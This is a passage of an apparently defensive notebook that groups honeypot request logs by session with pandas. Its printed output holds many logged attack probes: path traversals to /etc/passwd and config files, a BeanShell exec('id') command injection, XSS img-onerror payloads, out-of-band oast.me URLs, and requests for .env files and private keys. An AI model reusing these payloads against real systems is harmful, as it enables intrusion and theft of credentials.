# %%
import pandas as pd

df = pd.read_json("../tanner_report.json", lines=True)

df.head(5)
# Out:
#   method                                               path  \
# 0    GET                                                  /
# 1   HEAD                                                  /
# 2   POST  /public/index.php/material/Material/_download_...
# 3   POST                /servlet/~ic/bsh.servlet.BshServlet
# 4   POST             /dataSetParam/verification;swagger-ui/
#
#                                              headers  \
# 0  {'host': '127.0.0.1', 'user-agent': 'curl/7.81...
# 1  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 2  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 3  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 4  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
#
#                                    uuid                                 peer  \
# 0  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 38070}
# 1  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 58198}
# 2  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 58252}
# 3  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 58270}
# 4  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 58212}
#
#    status              cookies  \
# 0     200  {'sess_uuid': None}
# 1     200  {'sess_uuid': None}
# 2     200  {'sess_uuid': None}
# 3     200  {'sess_uuid': None}
# 4     200  {'sess_uuid': None}
#
#                                         response_msg  \
# 0  {'version': '0.6.0', 'response': {'message': {...
# 1  {'version': '0.6.0', 'response': {'message': {...
# 2  {'version': '0.6.0', 'response': {'message': {...
# 3  {'version': '0.6.0', 'response': {'message': {...
# 4  {'version': '0.6.0', 'response': {'message': {...
#
#                    timestamp                      post_data
# 0 2025-06-16 07:52:04.130283                            NaN
# 1 2025-06-16 07:52:12.383736                            NaN
# 2 2025-06-16 07:52:12.481975                  {'"1":1': ''}
# 3 2025-06-16 07:52:12.484291  {'bsh.script': 'exec("id");'}
# 4 2025-06-16 07:52:12.488787                             {}

# %%
# get the paths with params
# filtered_paths = filtered_df["path"]

# get the paths without params
df["path"] = df["path"].apply(lambda x: x.split('?', 1)[0])

df.head(5)
# Out:
#   method                                               path  \
# 0    GET                                                  /
# 1   HEAD                                                  /
# 2   POST  /public/index.php/material/Material/_download_...
# 3   POST                /servlet/~ic/bsh.servlet.BshServlet
# 4   POST             /dataSetParam/verification;swagger-ui/
#
#                                              headers  \
# 0  {'host': '127.0.0.1', 'user-agent': 'curl/7.81...
# 1  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 2  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 3  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 4  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
#
#                                    uuid                                 peer  \
# 0  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 38070}
# 1  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 58198}
# 2  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 58252}
# 3  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 58270}
# 4  2499449e-0489-48f5-9aef-7e98a82288bc  {'ip': '172.18.0.1', 'port': 58212}
#
#    status              cookies  \
# 0     200  {'sess_uuid': None}
# 1     200  {'sess_uuid': None}
# 2     200  {'sess_uuid': None}
# 3     200  {'sess_uuid': None}
# 4     200  {'sess_uuid': None}
#
#                                         response_msg  \
# 0  {'version': '0.6.0', 'response': {'message': {...
# 1  {'version': '0.6.0', 'response': {'message': {...
# 2  {'version': '0.6.0', 'response': {'message': {...
# 3  {'version': '0.6.0', 'response': {'message': {...
# 4  {'version': '0.6.0', 'response': {'message': {...
#
#                    timestamp                      post_data
# 0 2025-06-16 07:52:04.130283                            NaN
# 1 2025-06-16 07:52:12.383736                            NaN
# 2 2025-06-16 07:52:12.481975                  {'"1":1': ''}
# 3 2025-06-16 07:52:12.484291  {'bsh.script': 'exec("id");'}
# 4 2025-06-16 07:52:12.488787                             {}

# %%
paths_matrix = []
tmp = []
sess_uuids_paths = {
  # "{sess_uuid}": []
}
sess_uuids = []

for _, row in df.iterrows():
  sess_uuid = row.get("cookies", {}).get("sess_uuid") or row.get("response_msg", {}).get("response", {}).get("message", {}).get("sess_uuid")
  path = row["path"]

  if sess_uuid in sess_uuids:
    sess_uuids_paths[sess_uuid].append(path)
  else:
    sess_uuids_paths[sess_uuid] = [path]
    sess_uuids.append(sess_uuid)

paths_matrix = list(sess_uuids_paths.values())
# for paths in sess_uuids_paths.values():
#   paths_matrix.append(paths)

sess_uuids_paths
# paths_matrix
# print(len(paths_matrix), len(sess_uuids_paths.keys()))
# Out:
# {'f406da90-dfee-48da-901a-601277cb485f': ['/'],
#  'ca780e31-fc2d-43d3-bca8-86e2be49aa0f': ['/',
#   '/wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php',
#   '/wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php',
#   '/index.html',
#   '/index.html',
#   '/api/v1/database/6',
#   '/home/vtytt.php',
#   '/manager/html',
#   '/CDGServer3/SystemConfig',
#   '/bin.jar',
#   '/graph',
#   '/cgi-bin/Save.cgi',
#   '/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash',
#   '/index.php',
#   '/index.php',
#   '/agc/vicidial_mysqli_errors.txt'],
#  'b711708d-5a4a-43f5-be01-bcfb56905013': ['/public/index.php/material/Material/_download_imgage',
#   '/module/ph_simpleblog/list',
#   '/module/ph_simpleblog/list',
#   '/manager/html',
#   '/index.php',
#   '/login',
#   '/web.bz2',
#   '/api/v4/users/87',
#   '/admin.war',
#   '/..%5c..%5cetc/passwd',
#   '/asd/../../../../../../../../etc/passwd',
#   '/html/2word',
#   '/.styleci.yml'],
#  '1361067b-0089-46c4-9269-968cb8aa98d5': ['/servlet/~ic/bsh.servlet.BshServlet',
#   '/index.php',
#   '/manager/html',
#   '/public/plugins/esnet-matrix-panel/../../../../../conf/defaults.ini',
#   '/wp-includes/rss-functions.php',
#   '/_syslog.txt',
#   '/',
#   '/ocp.php',
#   '/////bin///querybuilder.json.servlet',
#   '/seeyon/personalBind.do.jpg/..;/ajax.do'],
#  '6ac16e1e-2df0-4887-88df-b6b1cf6750aa': ['/dataSetParam/verification;swagger-ui/',
#   '/',
#   '/login.do',
#   '/v1/sys/health',
#   '/backup_1.bz2',
#   '/https:%0a%0doast.me',
#   '/index.php',
#   '/index.php',
#   '/',
#   '/',
#   '/admin/login.jsp'],
#  '1c44fb9f-977f-41fc-9c09-6e8d01341ce6': ['/cgi-bin/rpc',
#   '/0.sql.zip',
#   '/Release.tar.z',
#   '/wp-content/plugins/sucuri-scanner/readme.txt',
#   '/../WEB-INF/web.xml;x=',
#   '/public/plugins/singlestat/../../../../../conf/defaults.ini',
#   '/_vti_pvt/service.cnf',
#   '/scriptcase/prod/lib/php/',
#   '/sftp.json',
#   '/cluster/cluster'],
#  'da733e50-f33d-4d70-bf57-444415073907': ['/WEB_VMS/LEVEL15/',
#   '/wp-content/plugins/imagements/images/2ya6s0ubccfsfqxw2zqvrndkmxm.php',
#   '/controller/login.php',
#   '/index.php',
#   '/api/2.0/mlflow/registered-models/create',
#   '/model-versions/get-artifact',
#   '/manager/html',
#   '/html.sql.lz',
#   '/test.tgz',
#   '/wp-content/plugins/backuply/readme.txt',
#   '/Release.7z',
#   '/https:///oast.me@oast.me/%2e%2e',
#   '/phpmyadmin/index.php',
#   '/_nuxt/@fs/windows/win.ini',
#   '/_next/../../../../../../../../../etc/passwd',
#   '/',
#   '/actuator',
#   '/favicon.ico',
#   '/actuator/favicon.ico'],
#  'b3869635-b872-46e9-ae55-c5e7130823c2': ['/index.php/User/doLogin',
#   '/api/blade-user/user-list',
#   '/index.htm',
#   '/manager/html',
#   '/api/docs/',
#   '/2025.sql.7z',
#   '/ROOT.tar.gz',
#   '/WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId',
#   '/portal/images/MyVue/MyVueHelp.png',
#   '/wp-admin/setup-config.php',
#   '/admin/login',
#   '/friends/ajax_invitej7hrg%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3ef26v4'],
#  '6a61bd65-e113-48e2-9eb9-e2ec1a81e11d': ['/zentao/user-login.html',
#   '/wp-json/lp/v1/courses/archive-course',
#   '/',
#   '/swagger',
#   '/servlet/taskProc/',
#   '/wp-content/plugins/mailchimp-for-wp/readme.txt',
#   '/data.bz2',
#   '/upload.sqlite',
#   '/wp-content/plugins/wp-seopress/readme.txt',
#   '/.env.local'],
#  '27a7b372-b7b2-4514-bc04-1408bb28f4b4': ['/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet',
#   '/index.php',
#   '/ROOT.z',
#   '/htdocs.Z',
#   '/home/courses',
#   '/config_application.txt',
#   '/',
#   '/register'],
#  'e8ec8669-7578-47af-8a30-129f76a2366e': ['/upgrade/detail.jsp/login/LoginSSO.jsp',
#   '/',
#   '/modules/leocustomajax/leoajax.php',
#   '/.env.live',
#   '/////etc.children.1.json',
#   '/api/v4/users/19',
#   '/index.php',
#   '/index.php',
#   '/index.php',
#   '/config.html',
#   '/duomiphp/ajax.php',
#   '/service/v1/service-details'],
#  '8ce0a3cc-7fa7-4e1e-8624-34d38d521c0e': ['/public/index.php',
#   '/file=%3C%21DOCTYPE',
#   '/openam/XUI',
#   '/127.0.tar',
#   '/upload.jar',
#   '/public/plugins/alertmanager/../../../../../conf/defaults.ini',
#   '/',
#   '/',
#   '/index.php',
#   '/index.php'],
#  '6488d57d-d911-44dc-b464-52f886e05438': ['/service/~iufo/com.ufida.web.action.ActionServlet',
#   '/wp-admin/admin-ajax.php',
#   '/wp-admin/admin-ajax.php',
#   '/ajax-api/2.0/mlflow/model-versions/create',
#   '/admin/',
#   '/manager/html',
#   '/0.1.lz',
#   '/uploads.sql.zip',
#   '/xampp/phpmyadmin/scripts/setup.php',
#   '/wp-content/plugins/fast-indexing-api/readme.txt',
#   '/public/plugins/pyroscope-panel/../../../../../conf/defaults.ini',
#   '/static/login/favicon.ico',
#   '/favicon.ico',
#   '/ipython/tree',
#   '/index.php',
#   '/index.php'],
#  '48b351b5-5b81-4d6d-98e1-0a6475a1defc': ['/mobile/plugin/browser.jsp',
#   '/uapjs/jsinvoke/',
#   '/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
#   '/Release.bz2',
#   '/v4/graphiql/finland',
#   '/ad-list-search',
#   '/wp-content/plugins/usc-e-shop/functions/progress-check.php',
#   '/.viminfo',
#   '/wp-content/plugins/usc-e-shop/functions/progress-check.php'],
#  '13529ce9-1616-46f2-ad6e-e5f26da203fb': ['/seeyon/htmlofficeservlet',
#   '/webapi/auth',
#   '/manager/html',
#   '/etc.json',
#   '/upload.z',
#   '/public/plugins/agenty-flowcharting-panel/../../../../../conf/defaults.ini',
#   '/',
#   '/system/bgservlets/test.css',
#   '/ccmivr/IVRGetAudioFile.do',
#   '/ccmivr/IVRGetAudioFile.do',
#   '/javax.faces.resources/faces-config.xml.jsf',
#   '/',
#   '/BACLIENT',
#   '/JNLP',
#   '/cms/admin/group/all'],
#  'ad467561-17b0-4aac-9dd1-a8ba7a280b93': ['/',
#   '/',
#   '/keepalive.php',
#   '/users;.',
#   '/openam/XUI/',
#   '/backup_4.tar',
#   '/system/help/support',
#   '/OA_HTML/jsp/bsc/bscpgraph.jsp',
#   '/OA_HTML/jsp/bsc/bscpgraph.jsp',
#   '/wp-content/plugins/simple-file-list/includes/ee-downloader.php',
#   '/versa/dist/images/versa-logo.png'],
#  'f19cfd55-07c3-4209-9e3d-374af765f671': ['/',
#   '/wp-admin/options-general.php',
#   '/app',
#   '/admin/login',
#   '/wp-json/sure-triggers/v1/automation/action',
#   '/api/login',
#   '/update.sh',
#   '/wwwroot.tar.z',
#   '/public_html.sql.gz',
#   '/mgmt/tm/sys/management-ip',
#   '/HyperGraphQL',
#   '/wp-content/plugins/webp-converter-for-media/readme.txt',
#   '/p/login/'],
#  '08f86f59-49d1-4ada-a68a-0599384ea9a4': ['/users/sign_in',
#   '/myaccount/javax.faces.resource/web.xml',
#   '/api/graphql',
#   '/prod.ini',
#   '/.github/workflows/test.yaml',
#   '/private.pem',
#   '/uploads.sql.z',
#   '/phpmyadmin/setup/',
#   '/v3/playground',
#   '/wp-content/plugins/jetpack-boost/readme.txt',
#   '/ftp.z',
#   '/src.xz',
#   '/Login',
#   '/cmd',
#   '/_config',
#   '/public/login.html',
#   '/index.php/Home/uploadify/fileList'],
#  '33147e86-2bb3-4653-94d9-b533b94ba32e': ['/wp-content/plugins/sniplets/readme.txt',
#   '/manager/html',
#   '/ssl.txt',
#   '/.json/FNZ.css',
#   '/uploads.tgz',
#   '/version',
#   '/inetpub.gz',
#   '/pmb/opac_css/ajax.php',
#   '/pma/index.php',
#   '/',
#   '/ztp/cgi-bin/handler',
#   '/server/wwtest/phpinfo.php',
#   '/composer.lock',
#   '/pre/config.php'],
#  '165640df-a690-42c4-a072-c616353eec7a': ['/public/index.php/home/file/user_pics',
#   '/render/public/..%252f%255Cd17sqb1q6jvuuc1vrlog5cjtcxebr6h6f.oast.live%252f%253F%252f..%252f..',
#   '/psp/csprd/',
#   '/2025.Z',
#   '/wp-content/plugins/autoptimize/readme.txt',
#   '/data.z',
#   '/properties/',
#   '/wp-content/plugins/brandfolder/callback.php',
#   '/log/view',
#   '/log/view',
#   '/NmConsole'],
#  'a6e4e87f-6a3c-472d-8915-39b287aca9c4': ['/servlet/~ic/bsh.servlet.BshServlet',
#   '/api/runscript',
#   '/index.php',
#   '/',
#   '/public.bz2',
#   '/api/v4/users/16',
#   '/fiori',
#   '/api/metrics'],
#  '7394fbab-3a2d-4621-aac6-41160d2c401c': ['/images/logo/logo-eoffice.php',
#   '/search-locker-details.php',
#   '/api/v1/database/9',
#   '/default/en_US/status.html',
#   '/conf/conf.sql.lz',
#   '/conf/conf.sql.zip',
#   '/wp-content/plugins/slideshow-jquery-image-gallery/readme.txt',
#   '/monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd'],
#  'da895010-c8ea-45e1-b927-c6e2e12d6d95': ['/servlet/codesettree',
#   '/WSVulnerabilityCore/VulCore.asmx',
#   '/manager/html',
#   '/api/v4/users/44',
#   '/v2/graph',
#   '/wp-content/plugins/easy-fancybox/readme.txt',
#   '/wp-content/plugins/gutenberg/readme.txt',
#   '/.env_1',
#   '/common/config.php.new'],
#  '859b79d7-8087-438f-8c74-6ec9fac185a7': ['/axis2-admin/login',
#   '/wp-content/uploads/html2wp/2ya6RrMISPI75ZTYimQ5Tlp7apz.php',
#   '/ajax-api/2.0/mlflow/model-versions/create',
#   '/management/export.php',
#   '/login',
#   '/site_cg/routes/configs/routes.ini',
#   '/bak.tar.gz',
#   '/////oast.me%5Ctoast.me/',
#   '/public/plugins/clarity89-finnhub-datasource/../../../../../conf/defaults.ini',
#   '/tmui/login.jsp',
#   '/test.txt',
#   '/%c0'],
#  '01bdd406-4b5b-4e86-a1b6-589d95ea0bfd': ['/axis2/axis2-admin/login',
#   '/api/snapshots',
#   '/hax/..CFIDE/adminapi/_servermanager/servermanager.cfc',
#   '/_sql',
#   '/~projects',
#   '/nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml',
#   '/manager/html',
#   '/index.php',
#   '/db.sql.7z',
#   '/upload.zip',
#   '/static/shards/html',
#   '/kiali/api/status',
#   '/adm_program/system/redirect.php',
#   '/',
#   '/index.php',
#   '/plugins/CoreHome/images/favicon.png'],
#  '6d898ba8-65a0-4fb5-90f8-8d1e9d6168a1': ['/wp-content/plugins/advanced-text-widget/readme.txt',
#   '/vendor/qcubed/qcubed/assets/php/profile.php',
#   '/manager/html',
#   '/127.0.bz2',
#   '/.ssh/id_rsa_1024',
#   '/web.sql.tar.z',
#   '/pma/setup/index.php',
#   '/wp-content/plugins/all-in-one-seo-pack/readme.txt',
#   '/////oast.me//',
#   '/public/plugins/computest-cloudwatchalarm-datasource/../../../../../conf/defaults.ini',
#   '/wxjsapi/saveYZJFile',
#   '/pimcore/app/config/pimcore/google-api-private-key.json',
#   '/system-diagnostics',
#   '/administrator/'],
#  '508ff3b3-10bb-4bc0-aa14-35ace8d08f0c': ['/wp-content/plugins/flash-album-gallery/readme.txt',
#   '/wwwroot.tar',
#   '/wp-content/plugins/sticky-header-effects-for-elementor/readme.txt',
#   '/.env.old',
#   '/royal_event/companyprofile.php',
#   '/cgi-bin/',
#   '/log/vpn.log'],
#  '08da8c15-e83d-4808-87c8-4c142ff1c81a': ['/login-x.php',
#   '/wp-admin/admin-ajax.php',
#   '/webtools/control/SOAPService',
#   '/manager/html',
#   '/',
#   '/127.0.0.1.bz2',
#   '/',
#   '/phpMyAdmin/index.php',
#   '/wp-admin/admin-ajax.php',
#   '/update.php',
#   '/app/config/security.yml',
#   '/message'],
#  '6420ba21-9855-4a7a-9de7-ac91da6a0dcf': ['/wp-content/plugins/adminimize/readme.txt',
#   '/zabbix/zabbix.php',
#   '/',
#   '/wp-content/plugins/paid-memberships-pro/js/updates.js',
#   '/',
#   '/php/node_info.php',
#   '/backup_4.Z',
#   '/wp-content/plugins/wp-statistics/readme.txt',
#   '/install/checks',
#   '/fastcgi.conf',
#   '/admin/public/login.jsp',
#   '/'],
#  '0bbfa63d-b8a1-4a76-8b92-4d5f5bead69b': ['/seeyon/test123456.jsp',
#   '/wp-admin/admin.php',
#   '/api/experimental/test',
#   '/wp-login.php',
#   '/////etc.children....4.2.1....json',
#   '/v1/api/graphql',
#   '/dump.sql.rar',
#   '/v2/graphql',
#   '/wp-content/plugins/webp-express/readme.txt',
#   '/UploadService/Page/',
#   '/',
#   '/webmail/',
#   '/log',
#   '/nuxeo/login.jsp'],
#  'a3ca4d3b-e033-4538-8a91-f6c61ccdcaff': ['/',
#   '/jeecg-boot/jmreport/qurestSql',
#   '/',
#   '/_session',
#   '/logs/error.log',
#   '/api.gz',
#   '/upload.sql.xz',
#   '/public/plugins/gridprotectionalliance-osisoftpi-datasource/../../../../../conf/defaults.ini',
#   '/bin/deletespace/Sandbox/',
#   '/Connect.do'],
#  'e8052535-7a23-4de3-b2ff-1d8add2f4997': ['/wp-content/plugins/skysa-official/readme.txt',
#   '/php/ping.php',
#   '/secserver/',
#   '/2025.tgz',
#   '/miscadmin',
#   '/actuator/jolokia/read/JMImplementation:type=MBeanServerDelegate/MBeanServerId',
#   '/servlet/mstrWebAdmin/',
#   '/wp-content/uploads/download-manager-files/',
#   '/index.html'],
#  '8b036c10-02b7-45a1-b0d4-1017f9ffa123': ['/wp-content/plugins/clickdesk-live-support-chat/readme.txt',
#   '/geoserver/ows',
#   '/manager/html',
#   '/_session',
#   '/error_log.txt',
#   '/backup_1.tar.gz',
#   '/backup_4.sql.tar.z',
#   '/download/index.php',
#   '/admin/suppliers/view_details.php',
#   '/download/index.php'],
#  '23cd789c-b06f-4cdf-8899-231633d50283': ['/wp-content/plugins/featurific-for-wordpress/readme.txt',
#   '/auth/login',
#   '/sso/XUI',
#   '/.json/FNZ.ico',
#   '/app.7z',
#   '/backup.sql.7z',
#   '/backup_4.sqlitedb',
#   '/bin.lz',
#   '/db.7z',
#   '/etc/passwd',
#   '/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini',
#   '/admin',
#   '/api/v1/canal/config/1/1',
#   '/en/products',
#   '/checker/login.php'],
#  '72172980-b2a7-40ee-9860-f2af9211728d': ['/',
#   '/wp-content/plugins/s3-video/readme.txt',
#   '/index.php',
#   '/',
#   '/api/sys/set_passwd',
#   '/',
#   '/api/v2/simulation',
#   '/js../.git/config',
#   '/test.xz',
#   '/sql.xz',
#   '/desktopmodules/dnnwerk.radeditorprovider/dialoghandler.aspx',
#   '/',
#   '/WS_FTP.LOG'],
#  'f1f03c14-50f2-4359-801c-22cb33eb232a': ['/wp-content/plugins/all-in-one-event-calendar/readme.txt',
#   '/openam/XUI/Login',
#   '/v2/playground',
#   '/inetpub.tar.z',
#   '/public/plugins/nodeGraph/../../../../../conf/defaults.ini',
#   '/wp-config.php.SAVE',
#   '/wp-content/plugins/under-construction-maintenance-mode/readme.txt',
#   '/pentaho/Login',
#   '/versa/app/img/versa-logo.png',
#   '/wp-content/plugins/w3-total-cache/pub/minify.php'],
#  '72d1c19a-229d-4628-b5ad-3e528cee9949': ['/reports/rwservlet/showenv',
#   '/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
#   '/config/pw_snmp_done.html',
#   '/config/pw_snmp.html',
#   '/wp-admin/admin-post.php',
#   '/',
#   '/flash/addcrypted2',
#   '/manager/html',
#   '/manager/html',
#   '/uploads.sql.bz2',
#   '/https%3a%2f%2foast.me%2f',
#   '/',
#   '/identification.php'],
#  '693f2d17-32c3-4dfa-ae43-a01e7223bb61': ['/wp-content/plugins/wp-facethumb/readme.txt',
#   '/libs/granite/core/content/login.html/j_security_check',
#   '/oauth/token',
#   '/dump.sql.z',
#   '/file/fileNoLogin/%7B%7Bidname%7D%7D',
#   '/gsearch.php.en',
#   '/en-US/login'],
#  'ed86cb09-811d-4c9d-9d92-a6c4e569e607': ['/index.php',
#   '/interface-data/books-init',
#   '/bin.war',
#   '/dump.sql.tar.gz',
#   '/upload.sqlitedb',
#   '/old.sql.bz2',
#   '/blast/nph-viewgif.cgi',
#   '/opensis/ajax.php',
#   '/opensis/ajax.php'],
#  '3135e605-c2ba-4d79-bbdc-270e5d0e69f5': ['/wp-content/plugins/mf-gig-calendar/readme.txt',
#   '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
#   '/service-worker.js',
#   '/public/checklogin.htm',
#   '/authorize',
#   '/db.xz',
#   '/output.tar.bz2',
#   '/uFVntQ.jsp',
#   '/remote/loginredir',
#   '/gallery/zp-core/setup/index.php',
#   '/sync/dropbox/download',
#   '/setup/setupcluster-start.action'],
#  '4d83b715-85d2-4167-ba79-fc6dbb837e3b': ['/wp-content/plugins/2-click-socialmedia-buttons/readme.txt',
#   '/druid/indexer/v1/sampler',
#   '/cmisatom/cmis-online/query',
#   '/manager/html',
#   '/login/userverify.cgi',
#   '/users/login',
#   '/cms/portlets/Telerik.Web.UI.DialogHandler.aspx',
#   '/web/login'],
#  '8b20a28f-70d5-4f61-b08f-10f5c228ff3e': ['/wp-content/plugins/download-monitor/readme.txt',
#   '/tos/index.php',
#   '/dana-na/auth/saml-sso.cgi',
#   '/manager/html',
#   '/manager/html',
#   '/api/v2/login',
#   '/db_backup.bak',
#   '/db.sql.gz',
#   '/wp-content/plugins/wordfence/readme.txt',
#   '////cmd.php',
#   '/crossdomain.xml',
#   '/res/../admin/diagnostic.jsp'],
#  'a3ad279d-f1ed-466d-9ba4-fd36f97cf456': ['/wp-content/plugins/advanced-text-widget/advancedtext.php',
#   '/index.action',
#   '/scp/login.php',
#   '/Synchronization',
#   '/manager/html',
#   '/cfide/componentutils/login.cfm',
#   '/',
#   '/authorization.do',
#   '/wp-content/plugins/constant-contact-forms/vendor/constantcontact/constantcontact/test/Json/Auth/token_info.json',
#   '/download.php'],
#  '90d17c4f-f8f7-458f-82f2-5d9c15bac17f': ['/wp-content/plugins/wp-integrator/readme.txt',
#   '/api/users',
#   '/manager/html',
#   '/htdocs.sql.lz',
#   '/altair',
#   '/laravel-filemanager',
#   '/config/env.js',
#   '/iNotes/Forms85.nsf'],
#  'bf4d00ff-56a9-43e7-873f-f41eb1c6dd55': ['/wp-content/plugins/age-verification/age-verification.php',
#   '/wp-admin/admin-ajax.php',
#   '/.env.local',
#   '/cgi-bin/common/login/webLogin',
#   '/shop/products',
#   '/artemis;/env;'],
#  'b038543c-f305-43bd-93da-55f55d358533': ['/wp-content/plugins/uploader/readme.txt',
#   '/index.php/video/',
#   '/v1/agent/check/register',
#   '/',
#   '/administrator/components/com_joommyadmin/phpmyadmin/',
#   '/database.sql.7z',
#   '/inetpub.xz',
#   '/wp-content/plugins/jetpack/readme.txt',
#   '/conf/conf.tgz',
#   '/public/plugins/boazreicher-mosaicplot-panel/../../../../../conf/defaults.ini',
#   '/public/plugins/linksmart-sensorthings-datasource/../../../../../conf/defaults.ini',
#   '/pyproject.toml',
#   '/mics/login.jsp'],
#  '94200f3c-eda8-4c55-bdad-fea94f7d1d4a': ['/wp-content/plugins/trafficanalyzer/readme.txt',
#   '/auth/realms/master/clients-registrations/default',
#   '/mod/lti/auth.php',
#   '/index.php',
#   '/api/v1/database/6',
#   '/',
#   '/',
#   '/manager/html',
#   '/shop/application/configs/application.ini',
#   '/home',
#   '/api/v4/users/69',
#   '/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx',
#   '/dump.tgz',
#   '/wp-content/plugins/intuitive-custom-post-order/readme.txt',
#   '/https:/oast.me',
#   '/inizio.php',
#   '/inizio.php',
#   '/',
#   '/xphoneconnect/admin/Login.aspx',
#   '/api/v2.0/systeminfo'],
#  '52af8efc-9a1a-45dd-9bf9-e76c0590f0e9': ['/index.action',
#   '/',
#   '/',
#   '/info.php',
#   '/manager/html',
#   '/web/rest/v1/login/sessions',
#   '/api/swagger/static/index.html',
#   '/.env.stage',
#   '/webapps.db',
#   '/je/graphql',
#   '/SetupConfig.xml',
#   '/i3geo/exemplos/codemirror.php',
#   '/i3geo/exemplos/codemirror.php',
#   '/.netrc',
#   '/Solar_SlideSub.php'],
#  'ebca9f83-0a91-44db-bf86-bc589019a1f6': ['/login.action',
#   '/manager/html',
#   '/manager/html',
#   '/api/v4/users/39',
#   '/MicroStrategy/',
#   '/v2/graphql/console',
#   '/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx',
#   '/admin/ajax.php',
#   '/sample.htaccess',
#   '/mnt/overlay/dam/gui/content/assets/metadataeditor.external.html',
#   '/admin/ajax.php',
#   '/wp-admin/admin-ajax.php',
#   '/haproxy'],
#  '182d47a9-50df-4ec3-879e-bf9ecc703c38': ['/index.action',
#   '/admin/index.php',
#   '/navigate/login.php',
#   '/api/v1/database/1',
#   '/classes/common/busiFacade.php',
#   '/config/pw_left_bar.html',
#   '/htdocs.war',
#   '/api/v4/users/10',
#   '/bak.tar',
#   '/sql.rar',
#   '/data.sql.gz',
#   '/cfide-scripts/ajax/package/cfajax.js',
#   '/hmc/hybris',
#   '/cgi-bin/broker',
#   '/cgi-bin/broker',
#   '/',
#   '/akuiteo.collabs/login/login.html',
#   '/akuiteo/login.html/'],
#  '7a1683ee-857d-44dd-a735-e51074ed84e8': ['/login.action',
#   '/db.7z',
#   '/cgi-bin/GetSrvInfo.exe',
#   '/.idea/httpRequests/http-requests-log.http'],
#  '208bef67-8f59-4e83-b8a6-7b372d1cae49': ['/login.action',
#   '/vpn/user/download/client',
#   '/vpn/user/download/client',
#   '/index.php',
#   '/jtcgi/r/adlogin/sso',
#   '/login.html',
#   '/control/userimage.html',
#   '/www.sql',
#   '/database.sql.z',
#   '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00',
#   '////hB3jS0DT%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm'],
#  '5aec79f0-e4c7-4439-ada2-6f2187850fc3': ['/index.action',
#   '/admin/login',
#   '/manager/html',
#   '/service/',
#   '/pma/server_import.php',
#   '/wp-config-backup.txt',
#   '/ccm-web/'],
#  '1c848754-e064-4a64-9576-e9f138f9661e': ['/index.action',
#   '/ckeditor/samples/plugins/htmlwriter/outputhtml.html',
#   '/wwwroot.gz',
#   '/appliance/login',
#   '/redmine/config/settings.yml',
#   '/system/login',
#   '/dashboard/favicon.ico'],
#  '5959acfc-f17b-4a2b-a40d-8c7207ce29a9': ['/index.action',
#   '/rpc.cgi',
#   '/nezjZahyvl.txt',
#   '/apisix/batch-requests',
#   '/wp-content/plugins/import-xml-feed/readme.txt',
#   '/geoserver/wfs',
#   '/manager/html',
#   '/0.sqlite',
#   '/wwwroot.db',
#   '/sysadmin/phpMyAdmin/scripts/setup.php',
#   '/bak.xz',
#   '/',
#   '/%E3%80%B5oast.me',
#   '/blog-search',
#   '/zms/admin/index.php',
#   '/home/0-WORDPRESS.txt',
#   '/login/hostinfo2.cgi',
#   '/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php',
#   '/',
#   '/login',
#   '/generatedHomepage.html'],
#  'f4dd62bd-cecd-4962-96ce-9cd130242bea': ['/secureader/javax.faces.resource/web.xml',
#   '/bsh.servlet.BshServlet',
#   '/bsh.servlet.BshServlet',
#   '/admin/manage_user.php',
#   '/login.php',
#   '/admin/folder.do',
#   '/test.sql.lz',
#   '/v3/subscriptions',
#   "/'",
#   '/bin/get/XWiki/SuggestSolrService',
#   '/debug/',
#   '/install.html'],
#  'f2680822-92b0-403f-b5f5-fa656e25b0a7': ['/costModule/faces/javax.faces.resource./WEB-INF/web.xml.jsf',
#   '/vendor/htmlawed/htmlawed/htmLawedTest.php',
#   '/decisioncenter/j_security_check',
#   '/SmartEditor2.html',
#   '/vendor/htmlawed/htmlawed/htmLawedTest.php',
#   '/backup_2.sqlite',
